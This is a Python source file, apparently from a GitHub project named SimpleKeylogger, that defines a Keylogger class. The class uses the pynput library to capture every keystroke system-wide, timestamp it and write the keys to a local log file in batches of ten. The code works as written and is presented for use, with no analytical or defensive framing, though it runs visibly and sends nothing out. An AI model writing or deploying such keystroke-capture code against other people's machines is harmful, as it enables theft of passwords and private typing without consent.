#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SimpleKeylogger - Basic keylogger implementation
Author: Yash (Popeye) Raut
GitHub: https://github.com/yashraut369
"""
import time
import datetime
import os
from pynput import keyboard
from utils import format_key, save_to_file

class Keylogger:
    """
    A basic keylogger class that records keystrokes and logs them to a file.
    """
    def __init__(self, log_file="keylog.txt"):
        """
        Initialize the keylogger with a log file.
        
        Args:
            log_file (str): Path to the log file where keystrokes will be saved
        """
        self.log_file = log_file
        self.keys = []
        self.count = 0
        self.start_dt = datetime.datetime.now()
        
    def on_press(self, key):
        """
        Callback function that's called when a key is pressed.
        
        Args:
            key: The key that was pressed
        """
        self.keys.append(key)
        self.count += 1
        
        # Format the key
        formatted_key = format_key(key)
        
        # Get current timestamp
        current_time = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        # Log the key press
        log_entry = f"[{current_time}] Key pressed: {formatted_key}"
        
        # Print on console for debugging
        print(log_entry)
        
        # Save to file every 10 keystrokes
        if self.count >= 10:
            self._report()
            
    def _report(self):
        """
        Save recorded keystrokes to the log file.
        """
        # Save to file if there are keys to save
        if self.keys:
            save_to_file(self.log_file, self.keys)
            
            # Reset keys and counter
            self.keys = []
            self.count = 0
            
    def start(self):
        """
        Start the keylogger.
        """
        print(f"[+] Keylogger started at {self.start_dt}")
        print(f"[+] Logging keystrokes to {os.path.abspath(self.log_file)}")
        
        # Start the keyboard listener
        with keyboard.Listener(on_press=self.on_press) as listener:
            try:
                listener.join()
            except KeyboardInterrupt:
                print("\n[!] Keylogger stopped")
                # Save any remaining keys before exiting
                if self.keys:
                    self._report()
